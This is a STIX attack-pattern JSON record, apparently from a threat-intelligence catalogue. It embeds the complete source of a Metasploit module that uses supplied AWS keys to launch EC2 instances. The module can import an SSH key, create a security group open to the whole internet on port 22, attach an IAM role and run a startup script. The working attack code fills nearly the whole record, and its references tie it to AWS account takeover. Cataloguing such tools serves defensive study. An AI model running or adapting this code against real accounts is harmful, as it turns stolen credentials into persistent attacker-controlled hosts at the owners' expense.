{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--eb9f18ee-2aaf-4ccf-80f2-a1666c34e7fa",
    "created": "2024-08-14T16:22:57.172588Z",
    "modified": "2024-08-14T16:22:57.172592Z",
    "name": "\"Launches Hosts in AWS\"",
    "description": " This module will attempt to launch an AWS instances (hosts) in EC2.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/aws/aws_launch_instances.rb",
            "external_id": "aws_launch_instances.rb"
        },
        {
            "source_name": "reference",
            "url": "https://drive.google.com/open?id=0B2Ka7F_6TetSNFdfbkI1cnJHUTQ"
        },
        {
            "source_name": "reference",
            "url": "https://published-prd.lanyonevents.com/published/rsaus17/sessionsFiles/4721/IDY-W10-DevSecOps-on-the-Offense-Automating-Amazon-Web-Services-Account-Takeover.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/aws/client'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Metasploit::Framework::Aws::Client\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'           => \"Launches Hosts in AWS\",\n        'Description'    => %q{\n          This module will attempt to launch an AWS instances (hosts) in EC2.\n        },\n        'License'        => MSF_LICENSE,\n        'Author'         => [\n          'Javier Godinez <godinezj[at]gmail.com>',\n        ],\n        'References'     => [\n          [ 'URL', 'https://drive.google.com/open?id=0B2Ka7F_6TetSNFdfbkI1cnJHUTQ'],\n          [ 'URL', 'https://published-prd.lanyonevents.com/published/rsaus17/sessionsFiles/4721/IDY-W10-DevSecOps-on-the-Offense-Automating-Amazon-Web-Services-Account-Takeover.pdf' ]\n        ]\n      )\n    )\n    register_options(\n      [\n        OptString.new('AccessKeyId', [true, 'AWS access key', '']),\n        OptString.new('SecretAccessKey', [true, 'AWS secret key', '']),\n        OptString.new('Token', [false, 'AWS session token', '']),\n        OptString.new('RHOST', [true, 'AWS region specific EC2 endpoint', 'ec2.us-west-2.amazonaws.com']),\n        OptString.new('Region', [true, 'The default region', 'us-west-2' ]),\n        OptString.new(\"AMI_ID\", [true, 'The Amazon Machine Image (AMI) ID', 'ami-1e299d7e']),\n        OptString.new(\"KEY_NAME\", [true, 'The SSH key to be used for ec2-user', 'admin']),\n        OptString.new(\"SSH_PUB_KEY\", [false, 'The public SSH key to be used for ec2-user, e.g., \"ssh-rsa ABCDE...\"', '']),\n        OptString.new(\"USERDATA_FILE\", [false, 'The script that will be executed on start', 'tools/modules/aws-aggregator-userdata.sh'])\n      ]\n    )\n    register_advanced_options(\n      [\n        OptPort.new('RPORT', [true, 'AWS EC2 Endpoint TCP Port', 443]),\n        OptBool.new('SSL', [true, 'AWS EC2 Endpoint SSL', true]),\n        OptString.new('INSTANCE_TYPE', [true, 'The instance type', 'm3.medium']),\n        OptString.new('ROLE_NAME', [false, 'The instance profile/role name', '']),\n        OptString.new('VPC_ID', [false, 'The EC2 VPC ID', '']),\n        OptString.new('SUBNET_ID', [false, 'The public subnet to use', '']),\n        OptString.new('SEC_GROUP_ID', [false, 'The EC2 security group to use', '']),\n        OptString.new('SEC_GROUP_CIDR', [true, 'EC2 security group network access CIDR', '0.0.0.0/0']),\n        OptString.new('SEC_GROUP_PORT', [true, 'EC2 security group network access PORT', 'tcp:22']),\n        OptString.new('SEC_GROUP_NAME', [false, 'Optional EC2 security group name', '']),\n        OptInt.new('MaxCount', [true, 'Maximum number of instances to launch', 1]),\n        OptInt.new('MinCount', [true, 'Minumum number of instances to launch', 1])\n      ]\n    )\n    deregister_options('VHOST')\n  end\n\n  def run\n    if datastore['AccessKeyId'].blank? || datastore['SecretAccessKey'].blank?\n      print_error(\"Both AccessKeyId and SecretAccessKey are required\")\n      return\n    end\n    # setup creds for making IAM API calls\n    creds = {\n      'AccessKeyId' => datastore['AccessKeyId'],\n      'SecretAccessKey' => datastore['SecretAccessKey']\n    }\n    creds['Token'] = datastore['Token'] unless datastore['Token'].blank?\n\n    create_keypair(creds) unless datastore['SSH_PUB_KEY'].blank?\n    vpc = datastore['VPC_ID'].blank? ? vpc(creds) : datastore['VPC_ID']\n    sg = datastore['SEC_GROUP_ID'].blank? ? create_sg(creds, vpc) : datastore['SEC_GROUP_ID']\n    subnet = datastore['SUBNET_ID'].blank? ? pub_subnet(creds, vpc) : datastore['SUBNET_ID']\n    unless subnet\n      print_error(\"Could not find a public subnet, please provide one\")\n      return\n    end\n    instance_id = launch_instance(creds, subnet, sg)\n    action = 'DescribeInstances'\n    doc = call_ec2(creds, 'Action' => action, 'InstanceId.1' => instance_id)\n    doc = print_results(doc, action)\n    begin\n      # need a better parser so we can avoid shit like this\n      ip = doc['reservationSet']['item']['instancesSet']['item']['networkInterfaceSet']['item']['privateIpAddressesSet']['item']['association']['publicIp']\n      print_status(\"Instance #{instance_id} has IP adrress #{ip}\")\n    rescue NoMethodError\n      print_error(\"Could not retrieve instance IP address\")\n    end\n  end\n\n  def opts(action, subnet, sg)\n    opts = {\n      'Action' => action,\n      'ImageId' => datastore['AMI_ID'],\n      'KeyName' => datastore['KEY_NAME'],\n      'InstanceType' => datastore['INSTANCE_TYPE'],\n      'NetworkInterface.1.SubnetId' => subnet,\n      'NetworkInterface.1.SecurityGroupId.1' => sg,\n      'MinCount' => datastore['MinCount'].to_s,\n      'MaxCount' => datastore['MaxCount'].to_s,\n      'NetworkInterface.1.AssociatePublicIpAddress' => 'true',\n      'NetworkInterface.1.DeviceIndex' => '0'\n    }\n    opts['IamInstanceProfile.Name'] = datastore['ROLE_NAME'] unless datastore['ROLE_NAME'].blank?\n    unless datastore['USERDATA_FILE'].blank?\n      if File.exist?(datastore['USERDATA_FILE'])\n        opts['UserData'] = URI::DEFAULT_PARSER.escape(Base64.encode64(open(datastore['USERDATA_FILE'], 'r').read).strip)\n      else\n        print_error(\"Could not open userdata file: #{datastore['USERDATA_FILE']}\")\n      end\n    end\n    opts\n  end\n\n  def launch_instance(creds, subnet, sg)\n    action = 'RunInstances'\n    print_status(\"Launching instance(s) in #{datastore['Region']}, AMI: #{datastore['AMI_ID']}, key pair name: #{datastore['KEY_NAME']}, security group: #{sg}, subnet ID: #{subnet}\")\n    doc = call_ec2(creds, opts(action, subnet, sg))\n    doc = print_results(doc, action)\n    return if doc.nil?\n    # TODO: account for multiple instances\n    if doc['instancesSet']['item'].instance_of?(Array)\n      instance_id = doc['instancesSet']['item'].first['instanceId']\n    else\n      instance_id = doc['instancesSet']['item']['instanceId']\n    end\n    print_status(\"Launched instance #{instance_id} in #{datastore['Region']} account #{doc['ownerId']}\")\n    action = 'DescribeInstanceStatus'\n    loop do\n      sleep(15)\n      doc = call_ec2(creds, 'Action' => action, 'InstanceId' => instance_id)\n      doc = print_results(doc, action)\n      if doc['instanceStatusSet'].nil?\n        print_error(\"Error, could not get instance status, instance possibly terminated\")\n        break\n      end\n      status = doc['instanceStatusSet']['item']['systemStatus']['status']\n      print_status(\"instance #{instance_id} status: #{status}\")\n      break if status == 'ok' || status != 'initializing'\n    end\n    instance_id\n  end\n\n  def create_keypair(creds)\n    action = 'ImportKeyPair'\n    doc = call_ec2(creds, 'Action' => action, 'KeyName' => datastore['KEY_NAME'], 'PublicKeyMaterial' => Rex::Text.encode_base64(datastore['SSH_PUB_KEY']))\n    if doc['Response'].nil?\n      doc = print_results(doc, action)\n      if doc['keyName'].nil? || doc['keyFingerprint'].nil?\n        print_error(\"Error creating key using privided key material (SSH_PUB_KEY)\")\n      else\n        print_status(\"Created #{doc['keyName']} (#{doc['keyFingerprint']})\")\n      end\n    else\n      if doc['Response']['Errors'] && doc['Response']['Errors']['Error']\n        print_error(doc['Response']['Errors']['Error']['Message'])\n      else\n        print_error(\"Error creating key using privided key material (SSH_PUB_KEY)\")\n      end\n    end\n  end\n\n  def pub_subnet(creds, vpc_id)\n    # First look for subnets that are configured to provision a public IP when instances are launched\n    action = 'DescribeSubnets'\n    doc = call_ec2(creds, 'Action' => action)\n    doc = print_results(doc, action)\n    vpc_subnets = doc['subnetSet']['item'].select { |x| x['vpcId'] == vpc_id }\n    pub_subnets = vpc_subnets.select { |x| x['mapPublicIpOnLaunch'] == 'true' }\n    return pub_subnets.first['subnetId'] if pub_subnets.count > 0\n\n    # Second, try to retrieve public subnet id by looking through route tables to find subnets\n    # associated with an Internet gateway\n    action = 'DescribeRouteTables'\n    doc = call_ec2(creds, 'Action' => action)\n    doc = print_results(doc, action)\n    vpc_route_table = doc['routeTableSet']['item'].select { |x| x['vpcId'] == vpc_id }\n    vpc_route_table.each do |route_table|\n      next if route_table['associationSet'].nil? || route_table['routeSet'].nil?\n      entries = route_table['routeSet']['item']\n      if entries.instance_of?(Hash)\n        if entries['gatewayId'].start_with?('igw-')\n          return route_table['associationSet']['item'].first['subnetId']\n        end\n      else\n        route_table['routeSet']['item'].each do |route|\n          if route['gatewayId'] && route['gatewayId'].start_with?('igw-')\n            return route_table['associationSet']['item'].first['subnetId']\n          end\n        end\n      end\n    end\n    nil\n  end\n\n  def create_sg(creds, vpc_id)\n    name = Rex::Text.rand_text_alphanumeric(8)\n    action = 'CreateSecurityGroup'\n    doc = call_ec2(creds, 'Action' => action, 'GroupName' => name, 'VpcId' => vpc_id, 'GroupDescription' => name)\n    doc = print_results(doc, action)\n    print_error(\"Could not create SG\") && return if doc['groupId'].nil?\n    sg = doc['groupId']\n    proto, port = datastore['SEC_GROUP_PORT'].split(':')\n    cidr = URI::DEFAULT_PARSER.escape(datastore['SEC_GROUP_CIDR'])\n    action = 'AuthorizeSecurityGroupIngress'\n    doc = call_ec2(creds, 'Action' => action,\n                          'IpPermissions.1.IpRanges.1.CidrIp' => cidr,\n                          'IpPermissions.1.IpProtocol' => proto,\n                          'IpPermissions.1.FromPort' => port,\n                          'IpPermissions.1.ToPort' => port,\n                          'GroupId' => sg)\n    doc = print_results(doc, action)\n    if doc['return'] && doc['return'] == 'true'\n      print_status(\"Created security group: #{sg}\")\n    else\n      print_error(\"Failed creating security group\")\n    end\n    sg\n  end\n\n  def vpc(creds)\n    action = 'DescribeVpcs'\n    doc = call_ec2(creds, 'Action' => action)\n    doc = print_results(doc, action)\n    if doc['vpcSet'].nil? || doc['vpcSet']['item'].nil?\n      print_error(\"Could not determine VPC ID for #{datastore['AccessKeyId']} in #{datastore['RHOST']}\")\n      return nil\n    end\n    item = doc['vpcSet']['item']\n    return item['vpcId'] if item.instance_of?(Hash)\n    return item.first['vpcId'] if item.instance_of?(Array) && !item.first['vpcId'].nil?\n    print_error(\"Could not determine VPC ID for #{datastore['AccessKeyId']} in #{datastore['RHOST']}\")\n    nil\n  end\nend\n"
}